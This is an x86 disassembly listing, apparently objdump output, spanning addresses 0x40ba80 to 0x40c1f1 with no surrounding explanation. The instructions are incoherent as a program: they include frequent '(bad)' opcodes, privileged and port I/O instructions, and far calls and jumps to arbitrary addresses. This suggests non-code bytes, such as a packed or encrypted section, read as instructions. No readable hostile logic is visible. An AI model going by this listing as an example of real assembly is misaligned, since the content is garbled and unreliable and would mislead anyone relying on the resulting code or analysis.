  40ba80:	jne    0x40ba67
  40ba82:	cwde   
  40ba83:	stc    
  40ba84:	aam    0x70
  40ba86:	mov    ecx,0xf988a579
  40ba8b:	adc    eax,0xdacaf481
  40ba90:	mov    bh,0x41
  40ba92:	fdivr  QWORD PTR [esi-0x600f7db0]
  40ba98:	mov    eax,0x97e650af
  40ba9d:	mov    ch,0xed
  40ba9f:	imul   esp,ebp,0xdf911605
  40baa5:	cmp    esp,DWORD PTR [esp+edi*2]
  40baa8:	sub    ch,BYTE PTR [eax]
  40baaa:	pop    edx
  40baab:	ins    BYTE PTR es:[edi],dx
  40baac:	rcl    DWORD PTR [ecx+0x5e],cl
  40baaf:	adc    ecx,DWORD PTR [esi-0x6b]
  40bab2:	inc    eax
  40bab3:	xchg   esp,eax
  40bab4:	pop    ecx
  40bab5:	call   0x82e3456f
  40baba:	cli    
  40babb:	mov    al,ds:0x78e6bc5e
  40bac0:	sub    DWORD PTR [ecx+esi*1],esi
  40bac3:	push   DWORD PTR [esi+0x16]
  40bac6:	and    al,0x30
  40bac8:	mov    ebp,0x6e71110e
  40bacd:	ss jae 0x40bac2
  40bad0:	sbb    DWORD PTR [ebx-0x4],0x236c5c9c
  40bad7:	jge    0x40bb0d
  40bad9:	out    dx,al
  40bada:	dec    ecx
  40badb:	lods   eax,DWORD PTR ds:[esi]
  40badc:	stos   DWORD PTR es:[edi],eax
  40badd:	hlt    
  40bade:	pop    DWORD PTR ss:[eax+0xb2db3ee]
  40bae5:	xor    BYTE PTR [edi],bh
  40bae7:	add    ecx,ebx
  40bae9:	push   ds
  40baea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baeb:	push   ds
  40baec:	pop    ds
  40baed:	popa   
  40baee:	jle    0x40bb3d
  40baf0:	cs retf 0xb831
  40baf4:	push   ecx
  40baf5:	ror    eax,1
  40baf7:	xor    esp,ebp
  40baf9:	rcl    BYTE PTR [edi+0x43],cl
  40bafc:	pop    ecx
  40bafd:	jne    0x40bae7
  40baff:	cld    
  40bb00:	test   DWORD PTR [eax-0x47dd316e],esi
  40bb06:	aam    0xf8
  40bb08:	sub    edi,DWORD PTR [eax+edi*8+0x68]
  40bb0c:	sar    DWORD PTR [ecx-0x70],1
  40bb0f:	stos   DWORD PTR es:[edi],eax
  40bb10:	cdq    
  40bb11:	cmp    al,BYTE PTR [ebx+edi*8-0x44]
  40bb15:	add    ebp,ebp
  40bb17:	dec    edi
  40bb18:	and    BYTE PTR [ebx-0x1fc7ceef],al
  40bb1e:	jmp    0x14ad11ec
  40bb23:	dec    esi
  40bb24:	out    0x32,eax
  40bb26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb27:	scas   eax,DWORD PTR es:[edi]
  40bb28:	jl     0x40bac8
  40bb2a:	mov    edi,0x7b485552
  40bb2f:	lea    edx,[edx+eax*2-0x75]
  40bb33:	push   cs
  40bb34:	sub    eax,0x9df65f9a
  40bb39:	mov    edi,0xb407d70d
  40bb3e:	out    dx,eax
  40bb3f:	loop   0x40bb57
  40bb41:	push   cs
  40bb42:	lods   al,BYTE PTR ds:[esi]
  40bb43:	push   es
  40bb44:	sub    DWORD PTR [ecx],eax
  40bb46:	fstp   DWORD PTR [edi-0x21]
  40bb49:	mov    eax,DWORD PTR [edx+ebx*4+0x2e]
  40bb4d:	pop    edi
  40bb4e:	stc    
  40bb4f:	cmp    eax,edi
  40bb51:	mov    ah,0xca
  40bb53:	gs das 
  40bb55:	loop   0x40bafa
  40bb57:	mov    es,WORD PTR ds:0xdad1878
  40bb5d:	mov    ds:0x5605683e,al
  40bb62:	jb     0x40bb9c
  40bb64:	in     eax,dx
  40bb65:	arpl   WORD PTR [edx],bx
  40bb67:	sbb    edx,DWORD PTR [edi]
  40bb69:	in     al,dx
  40bb6a:	and    esp,DWORD PTR [ecx]
  40bb6c:	pop    ebx
  40bb6d:	or     dl,dh
  40bb6f:	add    eax,0x82cbad65
  40bb74:	test   bh,dh
  40bb76:	stos   DWORD PTR es:[edi],eax
  40bb77:	(bad)  
  40bb78:	(bad)  
  40bb79:	call   0x5982ce4c
  40bb7e:	or     al,0xe0
  40bb80:	push   es
  40bb81:	cmp    edi,0xffffffcc
  40bb84:	retf   
  40bb85:	mov    cl,0xdc
  40bb87:	cwde   
  40bb88:	outs   dx,DWORD PTR ds:[esi]
  40bb89:	shr    BYTE PTR [edi+0xf4e40c9],cl
  40bb8f:	cli    
  40bb90:	mov    WORD PTR [eiz*2+0x64ae4687],?
  40bb97:	imul   ecx,DWORD PTR [ebp-0x60],0xffffffe5
  40bb9b:	jb     0x40bb31
  40bb9d:	sbb    ebx,DWORD PTR [edx-0x54]
  40bba0:	mov    BYTE PTR [eax-0x2a167d3b],cl
  40bba6:	scas   eax,DWORD PTR es:[edi]
  40bba7:	add    dl,BYTE PTR [edx-0x11f8a647]
  40bbad:	pop    edx
  40bbae:	mov    ds:0x2aed24c4,al
  40bbb3:	mov    ecx,0xd6f9547c
  40bbb8:	xchg   ebx,eax
  40bbb9:	push   cs
  40bbba:	mov    edx,0x41035069
  40bbbf:	mov    ds:0x123968d9,eax
  40bbc4:	push   ebx
  40bbc5:	xor    edi,ebp
  40bbc7:	pop    es
  40bbc8:	add    al,0x82
  40bbca:	loope  0x40bb7d
  40bbcc:	pop    esi
  40bbcd:	fimul  WORD PTR [edi-0x3ae2190e]
  40bbd3:	sub    BYTE PTR [eax],cl
  40bbd5:	outs   dx,DWORD PTR ds:[esi]
  40bbd6:	lods   eax,DWORD PTR ds:[esi]
  40bbd7:	aad    0x4d
  40bbd9:	cmp    BYTE PTR [eax+0x7ca23cf5],0x42
  40bbe0:	and    eax,0x7d9fe4d1
  40bbe5:	(bad)  
  40bbe6:	out    0x50,al
  40bbe8:	repnz int 0xf4
  40bbeb:	mov    ebx,0xf165e1e6
  40bbf0:	jnp    0x40bb99
  40bbf2:	ss mov ah,0x11
  40bbf5:	jmp    0x40bb98
  40bbf7:	cs (bad) 
  40bbf9:	cmc    
  40bbfa:	or     al,0xad
  40bbfc:	sbb    esi,DWORD PTR ss:[ebp+0x72]
  40bc00:	xlat   BYTE PTR ds:[ebx]
  40bc01:	fisub  WORD PTR [ebp-0x557897c]
  40bc07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc08:	repz cmp ecx,DWORD PTR [edi-0x3ab00444]
  40bc0f:	icebp  
  40bc10:	and    al,0xb
  40bc12:	inc    eax
  40bc13:	mov    ah,0xed
  40bc15:	into   
  40bc16:	jecxz  0x40bc33
  40bc18:	idiv   DWORD PTR [edi+eax*1]
  40bc1b:	or     eax,DWORD PTR ds:0xa9a3e83e
  40bc21:	mov    bl,0x17
  40bc23:	scas   al,BYTE PTR es:[edi]
  40bc24:	fnsave ds:0x50df7c9a
  40bc2a:	dec    esi
  40bc2b:	out    dx,eax
  40bc2c:	shl    DWORD PTR [edx-0x5389ab7f],0x43
  40bc33:	mov    edx,edx
  40bc35:	shl    esp,cl
  40bc37:	stos   DWORD PTR es:[edi],eax
  40bc38:	imul   edx,DWORD PTR [ebx+0x6e],0x7e
  40bc3c:	or     al,0xae
  40bc3e:	adc    DWORD PTR [esi-0x6e],esp
  40bc41:	add    DWORD PTR [ecx],eax
  40bc43:	pop    eax
  40bc44:	sbb    esp,DWORD PTR [ebx+ebx*4+0x71]
  40bc48:	cdq    
  40bc49:	jbe    0x40bc21
  40bc4b:	test   DWORD PTR [eax+0x64],eax
  40bc4e:	pop    ebp
  40bc4f:	jecxz  0x40bca1
  40bc51:	mov    ecx,0x7592d3c9
  40bc56:	xor    BYTE PTR [ecx+0x23],bl
  40bc59:	mov    ebx,0xf37648c3
  40bc5e:	sbb    DWORD PTR [ebx+0x20939011],edx
  40bc64:	jmp    0xc28d:0xe223fb19
  40bc6b:	imul   edi,DWORD PTR [edx+0x665fbc0d],0x61
  40bc72:	inc    BYTE PTR [esi-0x281f1b42]
  40bc78:	imul   ebp,esi,0xac8e1b1a
  40bc7e:	jo     0x40bc32
  40bc80:	ins    DWORD PTR es:[edi],dx
  40bc81:	xchg   esp,eax
  40bc82:	pop    ds
  40bc83:	pushf  
  40bc84:	mov    cl,0x81
  40bc86:	pop    eax
  40bc87:	mov    ebp,0x7d9a84e1
  40bc8c:	push   ecx
  40bc8d:	fs loopne 0x40bc64
  40bc90:	push   edx
  40bc91:	dec    edx
  40bc92:	dec    DWORD PTR [ebx-0x53]
  40bc95:	mov    ebx,0x7ed57e6d
  40bc9a:	push   ecx
  40bc9b:	cli    
  40bc9c:	repnz lods al,BYTE PTR ds:[esi]
  40bc9e:	xchg   ebp,eax
  40bc9f:	loopne 0x40bc7f
  40bca1:	xchg   BYTE PTR [edi+0x4182f37],dl
  40bca7:	xchg   esp,eax
  40bca8:	push   ss
  40bca9:	and    eax,0x1c7db244
  40bcae:	inc    esi
  40bcaf:	xchg   ebx,eax
  40bcb0:	dec    esi
  40bcb1:	xor    BYTE PTR [ebp-0x1b],bl
  40bcb4:	les    esi,FWORD PTR [eax+edi*2-0x67]
  40bcb8:	pop    edi
  40bcb9:	sbb    cl,cl
  40bcbb:	xlat   BYTE PTR ds:[ebx]
  40bcbc:	aaa    
  40bcbd:	dec    ecx
  40bcbe:	stc    
  40bcbf:	mov    eax,ds:0x7944e38d
  40bcc4:	sbb    eax,0xec0ab736
  40bcc9:	ret    
  40bcca:	ss mov al,0x9
  40bccd:	mov    bl,BYTE PTR [edi+0x2f4b662]
  40bcd3:	ror    BYTE PTR [ecx+esi*2+0x66],cl
  40bcd7:	aam    0x3
  40bcd9:	inc    esp
  40bcda:	pop    ss
  40bcdb:	loope  0x40bcab
  40bcdd:	(bad)  
  40bcde:	dec    ebx
  40bcdf:	(bad)  
  40bce0:	jne    0x40bcc4
  40bce2:	jb     0x40bd25
  40bce4:	pusha  
  40bce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce6:	mov    ecx,0xca362754
  40bceb:	pop    esp
  40bcec:	ror    DWORD PTR [ecx+0x3f],0x93
  40bcf0:	adc    BYTE PTR [ecx],bl
  40bcf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcf3:	mov    ds:0xefdaa702,eax
  40bcf8:	fiadd  DWORD PTR [eax]
  40bcfa:	sti    
  40bcfb:	mov    eax,ds:0x71677ea2
  40bd00:	xchg   edi,eax
  40bd01:	lea    eax,[edi-0x32]
  40bd04:	inc    esp
  40bd05:	mov    BYTE PTR [ebp-0x267a7496],0x27
  40bd0c:	mov    ebp,0x3e414a44
  40bd11:	inc    ecx
  40bd12:	fnstenv gs:[ebp-0x7e54cab5]
  40bd19:	les    esp,FWORD PTR [edx]
  40bd1b:	cmc    
  40bd1c:	ja     0x8ab61d95
  40bd22:	pop    ss
  40bd23:	inc    edx
  40bd24:	out    dx,al
  40bd25:	std    
  40bd26:	sub    al,BYTE PTR [esi+0x2b]
  40bd29:	mov    ecx,0x6980a9ef
  40bd2e:	addr16 push ebx
  40bd30:	test   DWORD PTR [eax+0x268cf702],0xb3651f97
  40bd3a:	sbb    BYTE PTR [ecx+0x8],al
  40bd3d:	and    al,0x4e
  40bd3f:	sbb    ch,ah
  40bd41:	or     bh,BYTE PTR [ebx-0x13]
  40bd44:	fdivr  st,st(6)
  40bd46:	loop   0x40bd9e
  40bd48:	cs imul ebp,edi,0xbf4c9dfe
  40bd4f:	ret    
  40bd50:	or     eax,0x63a26026
  40bd55:	dec    ebp
  40bd56:	test   eax,0xc01a28fb
  40bd5b:	xor    eax,0xe754aba8
  40bd60:	bound  edx,QWORD PTR [esi-0x2c88d96e]
  40bd66:	mov    edi,0x9fe08c90
  40bd6b:	mov    bh,ah
  40bd6d:	or     ebp,DWORD PTR [ecx+0x8889e57]
  40bd73:	mov    ebx,0x287f9cb0
  40bd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd79:	xchg   esp,eax
  40bd7a:	push   edx
  40bd7b:	je     0x40bd53
  40bd7d:	mov    ebx,0xda1851d4
  40bd82:	outs   dx,DWORD PTR ds:[esi]
  40bd83:	cmp    DWORD PTR [ecx],0x780fc900
  40bd89:	sar    BYTE PTR [ebx+0x23789efe],1
  40bd8f:	add    DWORD PTR [ecx],edi
  40bd91:	sbb    DWORD PTR [ecx+0x772d15ce],edx
  40bd97:	add    edx,esp
  40bd99:	xchg   edx,eax
  40bd9a:	jns    0x40bda5
  40bd9c:	add    eax,0x55d05fac
  40bda1:	mov    eax,0xd0a77eb9
  40bda6:	bound  esi,QWORD PTR [edx+eax*4+0x1d]
  40bdaa:	mov    bh,0xf0
  40bdac:	(bad)  
  40bdad:	icebp  
  40bdae:	mov    eax,ds:0xbcbdd5d7
  40bdb3:	push   ebx
  40bdb4:	inc    eax
  40bdb5:	cmp    ebx,DWORD PTR [edx]
  40bdb7:	sbb    edi,eax
  40bdb9:	push   ebp
  40bdba:	xchg   esp,eax
  40bdbb:	mov    dh,0xca
  40bdbd:	imul   esi,DWORD PTR [eax],0x5e92724d
  40bdc3:	adc    eax,0xbf78f73
  40bdc8:	lds    eax,FWORD PTR [edx-0x32]
  40bdcb:	js     0x40be1e
  40bdcd:	loop   0x40bdd5
  40bdcf:	push   0x4c8a61f6
  40bdd4:	shr    BYTE PTR [esi+0x14],1
  40bdd7:	or     ebx,DWORD PTR [ecx+0x63]
  40bdda:	ror    DWORD PTR [edx],cl
  40bddc:	dec    edi
  40bddd:	xchg   ebp,eax
  40bddf:	call   0x3336:0x6f94a25c
  40bde6:	or     DWORD PTR [ecx+0x41],edi
  40bde9:	sub    dh,BYTE PTR [eax-0x38b38c9b]
  40bdef:	int    0x41
  40bdf1:	into   
  40bdf2:	xchg   ecx,eax
  40bdf3:	fidivr DWORD PTR [ebp-0x9f7c63e]
  40bdf9:	mov    dh,0x5b
  40bdfb:	out    dx,al
  40bdfc:	jne    0x40bdef
  40bdfe:	xchg   esi,eax
  40bdff:	pop    ecx
  40be00:	mov    edi,eax
  40be02:	out    dx,al
  40be03:	cmp    DWORD PTR [edi],ebx
  40be05:	jns    0x40be5d
  40be07:	popf   
  40be08:	xor    ch,bh
  40be0a:	int3   
  40be0b:	repz push esp
  40be0d:	mov    dh,0xca
  40be0f:	scas   al,BYTE PTR es:[edi]
  40be10:	cmp    DWORD PTR [edi+0x2d],edi
  40be13:	(bad)  
  40be14:	xor    al,0xfc
  40be16:	lds    eax,FWORD PTR [esi-0x43]
  40be19:	(bad)
  40be1c:	or     al,BYTE PTR [ebx+0x78e79784]
  40be22:	jo     0x40bdb2
  40be24:	xor    al,0xb0
  40be26:	lods   al,BYTE PTR ds:[esi]
  40be27:	neg    DWORD PTR [ecx+0x31]
  40be2a:	mov    al,0x9d
  40be2c:	or     ch,BYTE PTR [edx+ebx*2]
  40be2f:	xor    bh,BYTE PTR [ebx+0x224a59b5]
  40be35:	dec    ecx
  40be36:	jnp    0x40beb4
  40be38:	popa   
  40be39:	leave  
  40be3a:	cdq    
  40be3b:	and    esi,esp
  40be3d:	ins    DWORD PTR es:[edi],dx
  40be3e:	pop    DWORD PTR [ebx+edi*1+0x4c49a321]
  40be45:	mov    esi,0x6b5a3c88
  40be4a:	data16 mov ds:0x600193d3,al
  40be50:	inc    edx
  40be51:	add    al,0xa
  40be53:	test   BYTE PTR [esi-0x546fb3a5],bh
  40be59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be5a:	outs   dx,DWORD PTR ds:[esi]
  40be5b:	out    dx,al
  40be5c:	cmp    DWORD PTR [eax],ebp
  40be5e:	xchg   ebx,eax
  40be5f:	out    dx,al
  40be60:	jae    0x40be94
  40be62:	push   ebp
  40be63:	sbb    BYTE PTR [edx+0x79],bh
  40be66:	pop    ebx
  40be67:	ins    BYTE PTR es:[edi],dx
  40be68:	sub    al,0x2
  40be6a:	xor    BYTE PTR [edx],bl
  40be6c:	test   DWORD PTR [edi-0x608d7cb5],esi
  40be72:	jo     0x40be8b
  40be74:	and    al,0xae
  40be76:	in     eax,dx
  40be77:	jb     0x40bdfc
  40be79:	call   0x8e24:0x62c2178
  40be80:	cmp    bh,BYTE PTR [edi-0x27]
  40be83:	jb     0x40be5e
  40be85:	mov    edi,0xa33640c1
  40be8a:	mov    bl,0xdd
  40be8c:	inc    ebp
  40be8d:	or     ebx,DWORD PTR ds:0x62a9c962
  40be93:	sub    ah,BYTE PTR [edx]
  40be95:	in     eax,dx
  40be96:	inc    edi
  40be97:	xor    al,0x48
  40be99:	mov    eax,ds:0x87e84cf3
  40be9e:	js     0x40be24
  40bea0:	sbb    al,0x72
  40bea2:	out    0x9f,eax
  40bea4:	lock test DWORD PTR [ebp-0x5493f565],esi
  40beab:	pop    ds
  40beac:	fwait
  40bead:	and    DWORD PTR [eax+0xd977bf4],0x6a
  40beb4:	add    al,0xbb
  40beb6:	in     eax,0x14
  40beb8:	xor    BYTE PTR [ecx+0x2d],dh
  40bebb:	gs mov ecx,0xfe7270f7
  40bec1:	gs mov edx,0xe3ca94e9
  40bec7:	(bad)  
  40bec8:	mov    cs:0xf4499cda,eax
  40bece:	retf   
  40becf:	scas   eax,DWORD PTR es:[edi]
  40bed0:	add    al,BYTE PTR [esp+edx*4+0x245639b6]
  40bed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed8:	sbb    DWORD PTR [edx-0x3a],ebp
  40bedb:	aaa    
  40bedc:	jmp    0xbd49:0xbbe021e4
  40bee3:	mov    cl,0xf7
  40bee5:	inc    DWORD PTR [edi]
  40bee7:	mov    ds:0x79dad528,al
  40beec:	inc    esp
  40beed:	sub    eax,0xa22f85e
  40bef2:	cdq    
  40bef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef4:	shl    BYTE PTR [ecx+0x67],cl
  40bef7:	sbb    eax,0xffcf92f5
  40befc:	and    eax,0x166e01ea
  40bf01:	scas   al,BYTE PTR es:[edi]
  40bf02:	fistp  QWORD PTR [eax-0x51dfe06d]
  40bf08:	sbb    ch,BYTE PTR [esi+edx*2]
  40bf0b:	(bad)  
  40bf0c:	in     eax,0xf0
  40bf0e:	cmp    edx,edi
  40bf10:	jo     0x40bf88
  40bf12:	aam    0x24
  40bf14:	int3   
  40bf15:	popa   
  40bf16:	into   
  40bf17:	mov    ecx,edi
  40bf19:	ficomp WORD PTR [eax-0x31403c57]
  40bf1f:	sbb    cl,bh
  40bf21:	push   edx
  40bf22:	mov    bl,0xf2
  40bf24:	test   BYTE PTR [esi-0x728712ab],ah
  40bf2a:	mov    esi,0xfb25cf19
  40bf2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf30:	jg     0x40bfa6
  40bf32:	ror    DWORD PTR [ebp+0x30c38199],1
  40bf38:	fs pop ebp
  40bf3a:	xchg   DWORD PTR [esi-0x7e],esp
  40bf3d:	mov    ds:0x958172e,eax
  40bf42:	and    edi,eax
  40bf44:	mov    ch,0xe6
  40bf46:	adc    eax,0x41bda6f9
  40bf4b:	mov    edi,0xc34d3a6
  40bf50:	sub    BYTE PTR [ebx],al
  40bf52:	lea    edi,[edi+0x44]
  40bf55:	mov    ebp,0x402aeade
  40bf5a:	mov    al,BYTE PTR [ecx-0x49570f5a]
  40bf60:	(bad)
  40bf63:	sti    
  40bf64:	xchg   ebp,eax
  40bf65:	in     eax,dx
  40bf66:	mov    bh,BYTE PTR [eax+ecx*2]
  40bf69:	cmp    al,0xae
  40bf6b:	test   eax,0x8ac8f190
  40bf70:	je     0x40bf6f
  40bf72:	ins    BYTE PTR es:[edi],dx
  40bf73:	rol    BYTE PTR [ebx],1
  40bf75:	(bad)  
  40bf76:	ins    BYTE PTR es:[edi],dx
  40bf77:	icebp  
  40bf78:	sti    
  40bf79:	out    dx,al
  40bf7a:	push   esi
  40bf7b:	aas    
  40bf7c:	xor    edx,ecx
  40bf7e:	jmp    0x9a64f891
  40bf83:	data16 sbb cl,bl
  40bf86:	and    eax,0x9fbc1861
  40bf8b:	pop    edi
  40bf8c:	adc    DWORD PTR [eax+0x1d],edx
  40bf8f:	scas   eax,DWORD PTR es:[edi]
  40bf90:	inc    ecx
  40bf91:	in     eax,0xa2
  40bf93:	push   0xffffffbb
  40bf95:	pop    eax
  40bf96:	retf   
  40bf97:	pop    es
  40bf98:	ds jl  0x40bfe3
  40bf9b:	and    DWORD PTR [eax+edx*8-0x519536],edi
  40bfa2:	or     al,BYTE PTR [esi+esi*4+0x45]
  40bfa6:	aaa    
  40bfa7:	aam    0xc6
  40bfa9:	fsubr  QWORD PTR [ebx-0x5654c04]
  40bfaf:	shl    DWORD PTR [ebp+0x5a],0x48
  40bfb3:	and    edx,DWORD PTR [edi+edx*2+0x3a0f2df0]
  40bfba:	mov    bl,0x7
  40bfbc:	stos   DWORD PTR es:[edi],eax
  40bfbd:	cmp    eax,0x6608491d
  40bfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc3:	in     al,0x1e
  40bfc5:	shr    ch,0x91
  40bfc8:	outs   dx,BYTE PTR ds:[esi]
  40bfc9:	mov    ch,0x43
  40bfcb:	(bad)  
  40bfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfcd:	call   0xf50d:0x54206427
  40bfd4:	repnz fs ficomp WORD PTR gs:[edi+ecx*1+0x604f55ba]
  40bfde:	sti    
  40bfdf:	out    0xb4,eax
  40bfe1:	leave  
  40bfe2:	bound  ecx,QWORD PTR [edx-0x2b724b29]
  40bfe8:	sahf   
  40bfe9:	data16 (bad) 
  40bfeb:	push   ds
  40bfec:	aad    0xf4
  40bfee:	std    
  40bfef:	aam    0x6b
  40bff1:	lods   al,BYTE PTR ds:[esi]
  40bff2:	sbb    al,0xcc
  40bff4:	inc    ecx
  40bff5:	sbb    ebx,DWORD PTR [ecx-0x5676862]
  40bffb:	mov    cl,0x3c
  40bffd:	xchg   DWORD PTR [esi],esi
  40bfff:	mov    BYTE PTR [ebx-0x4cdd3711],ah
  40c005:	mov    al,ds:0x9dd21a6c
  40c00a:	aad    0x79
  40c00c:	cwde   
  40c00d:	push   ecx
  40c00e:	jnp    0x40bfea
  40c010:	fisubr WORD PTR [esi-0x1c1a4850]
  40c016:	xor    DWORD PTR [ebx+0x66eef0c4],ebx
  40c01c:	pushfw 
  40c01e:	inc    esi
  40c01f:	pop    eax
  40c020:	push   ecx
  40c021:	fstp   QWORD PTR [edx+ebp*1+0x79a00b8d]
  40c028:	pushf  
  40c029:	mov    esi,0x35f50ca9
  40c02e:	test   BYTE PTR [ecx],0x15
  40c031:	cmp    BYTE PTR [ebx-0x4d],ch
  40c034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c035:	jo     0x40c05c
  40c037:	xchg   BYTE PTR [esi],ch
  40c039:	ret    0xc3c6
  40c03c:	inc    ecx
  40c03d:	push   0xadc0a395
  40c042:	push   ebp
  40c043:	stos   BYTE PTR es:[edi],al
  40c044:	scas   eax,DWORD PTR es:[edi]
  40c045:	dec    ebx
  40c046:	aas    
  40c047:	sub    esp,ebp
  40c049:	js     0x40c001
  40c04b:	xchg   BYTE PTR [edx-0x7a9cee56],ch
  40c051:	jmp    0x40c09b
  40c053:	ret    0xebbd
  40c056:	lods   eax,DWORD PTR ds:[esi]
  40c057:	push   cs
  40c058:	ret    0xfe59
  40c05b:	dec    ebx
  40c05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05d:	push   cs
  40c05e:	hlt    
  40c05f:	dec    edi
  40c060:	mov    eax,ds
  40c062:	lock pop ebp
  40c064:	push   ebp
  40c065:	in     eax,0x1
  40c067:	add    al,0x51
  40c069:	xchg   esi,eax
  40c06a:	out    0x3f,eax
  40c06c:	dec    ebp
  40c06d:	ror    DWORD PTR [ebx],0xf7
  40c070:	sbb    BYTE PTR [edi],dl
  40c072:	cs cwde 
  40c074:	retf   0x7093
  40c077:	mov    esi,0xd4548d6e
  40c07c:	ins    DWORD PTR es:[edi],dx
  40c07d:	mov    ebp,ds
  40c07f:	jl     0x40c077
  40c081:	call   0x97e2:0x12183c96
  40c088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c089:	(bad)  
  40c08a:	mov    al,BYTE PTR [eax+0x4b]
  40c08d:	sbb    eax,0x1a057675
  40c092:	ficom  WORD PTR [ebx]
  40c094:	cs push ss
  40c096:	pop    eax
  40c097:	jge    0x40c07c
  40c099:	xchg   ecx,eax
  40c09a:	out    0xb8,al
  40c09c:	pop    ebp
  40c09d:	jae    0x40c06c
  40c09f:	or     bh,BYTE PTR [edi-0x6acb8318]
  40c0a5:	imul   ebx,edi,0xffffff8a
  40c0a8:	jae    0x40c0d6
  40c0aa:	cs inc ecx
  40c0ac:	sub    BYTE PTR ss:[edx-0x7f75d1d4],cl
  40c0b3:	mov    bh,0x74
  40c0b5:	mov    ?,WORD PTR [edi+0x7fb2baa9]
  40c0bb:	(bad)  
  40c0bc:	dec    edx
  40c0bd:	sub    BYTE PTR [esi+0x4c9b1bfa],0x13
  40c0c4:	dec    eax
  40c0c5:	xchg   edx,eax
  40c0c6:	fild   WORD PTR [ecx]
  40c0c8:	cmp    BYTE PTR [edx-0x74],bl
  40c0cb:	sbb    BYTE PTR [ebx+edi*4+0x68f44e3f],dl
  40c0d2:	jecxz  0x40c076
  40c0d4:	mov    ds:0x5b903d16,eax
  40c0d9:	clc    
  40c0da:	aad    0xd2
  40c0dc:	sub    al,0xbc
  40c0de:	add    DWORD PTR [ecx+0x79],eax
  40c0e1:	or     DWORD PTR [eax],esp
  40c0e3:	sub    cl,al
  40c0e5:	js     0x40c0e0
  40c0e7:	sub    ah,BYTE PTR ds:0x7eb81d7a
  40c0ed:	ss clc 
  40c0ef:	lds    ebx,FWORD PTR [ebx+ebp*1-0x7e3c90da]
  40c0f6:	shl    BYTE PTR [esi],cl
  40c0f8:	std    
  40c0f9:	(bad)  
  40c0fa:	dec    edi
  40c0fb:	leave  
  40c0fc:	add    DWORD PTR [edx+0x5a9b1b2c],ebx
  40c102:	fsubr  DWORD PTR [esi-0x1c2863c8]
  40c108:	xchg   ecx,eax
  40c109:	movd   DWORD PTR [edi+edi*1-0x69],mm7
  40c10e:	fwait
  40c10f:	stc    
  40c110:	jb     0x40c135
  40c112:	pop    edx
  40c113:	mov    esi,0x6db211af
  40c118:	pop    ss
  40c119:	or     dl,BYTE PTR [ebx]
  40c11b:	push   es
  40c11c:	mov    esp,ebx
  40c11e:	(bad)  
  40c11f:	imul   edx,DWORD PTR [edi+0x450a2dc6],0xffffff96
  40c126:	mov    edx,DWORD PTR [ebx+0x2c]
  40c129:	dec    esi
  40c12a:	das    
  40c12b:	ins    DWORD PTR es:[edi],dx
  40c12c:	sti    
  40c12d:	jl     0x40c105
  40c12f:	mov    edi,0x10984569
  40c134:	pop    es
  40c135:	xor    eax,0x290499d0
  40c13a:	pusha  
  40c13b:	addr16 jns 0x40c155
  40c13e:	jmp    0x40c16c
  40c140:	(bad)  
  40c141:	enter  0x501a,0x3b
  40c145:	repz out 0x76,eax
  40c148:	pop    ecx
  40c149:	xor    cl,dh
  40c14b:	js     0x40c0d9
  40c14d:	cwde   
  40c14e:	add    cl,BYTE PTR [edx]
  40c150:	fld    TBYTE PTR [edi-0x1ddf1954]
  40c156:	sahf   
  40c157:	ins    BYTE PTR es:[edi],dx
  40c158:	ins    BYTE PTR es:[edi],dx
  40c159:	add    eax,0xa6223c9
  40c15e:	cmp    cl,BYTE PTR [edi]
  40c160:	sbb    BYTE PTR [eax-0x79b44b5b],cl
  40c166:	pusha  
  40c167:	xchg   esi,eax
  40c168:	push   ebx
  40c169:	jb     0x40c133
  40c16b:	pop    eax
  40c16c:	mov    BYTE PTR [eax-0x63551e02],cl
  40c172:	bound  esp,QWORD PTR [esi+eiz*8]
  40c175:	loope  0x40c1ee
  40c177:	dec    ebp
  40c178:	cwde   
  40c179:	push   edx
  40c17a:	inc    esp
  40c17b:	pop    eax
  40c17c:	sub    ecx,eax
  40c17e:	ror    DWORD PTR [esi],0xf9
  40c181:	test   eax,0xdf4932e
  40c186:	call   0xc393:0x14332279
  40c18d:	pop    edx
  40c18e:	add    al,0xdf
  40c190:	dec    ecx
  40c191:	mov    DWORD PTR [esi-0x1],0x40057cb8
  40c198:	and    ebx,ebp
  40c19a:	les    esp,FWORD PTR [ecx-0x8]
  40c19d:	cli    
  40c19e:	jge    0x40c189
  40c1a0:	jecxz  0x40c1f2
  40c1a2:	mov    al,ds:0x13cdcfc6
  40c1a7:	es jg  0x40c208
  40c1aa:	xor    DWORD PTR [edx+ebx*1-0x4a],0xffffffc8
  40c1af:	cmp    cl,BYTE PTR [eax+0x59]
  40c1b2:	add    BYTE PTR [eax+0xc],dh
  40c1b5:	inc    esi
  40c1b6:	(bad)  
  40c1b7:	int3   
  40c1b8:	xchg   ebp,eax
  40c1b9:	add    dl,BYTE PTR [eax]
  40c1bb:	idiv   DWORD PTR [eax+0x57ab630b]
  40c1c1:	mov    bl,0xe8
  40c1c3:	mov    dh,0x54
  40c1c5:	adc    eax,0x2b43f27b
  40c1ca:	sti    
  40c1cb:	mov    esi,edi
  40c1cd:	and    bl,BYTE PTR [bp+si+0x321f]
  40c1d2:	dec    ecx
  40c1d3:	adc    al,0x19
  40c1d5:	mov    dh,0xef
  40c1d7:	imul   ebp,DWORD PTR [eax],0x79510d7e
  40c1dd:	xchg   BYTE PTR [edi+0x1e],cl
  40c1e0:	xor    al,BYTE PTR [edx-0x388f61b5]
  40c1e6:	push   ss
  40c1e7:	dec    esi
  40c1e8:	jmp    0x41d09dcd
  40c1ed:	dec    ecx
  40c1ee:	cmp    cl,BYTE PTR [ebp+0x29]
  40c1f1:	and    al,BYTE PTR [edi]
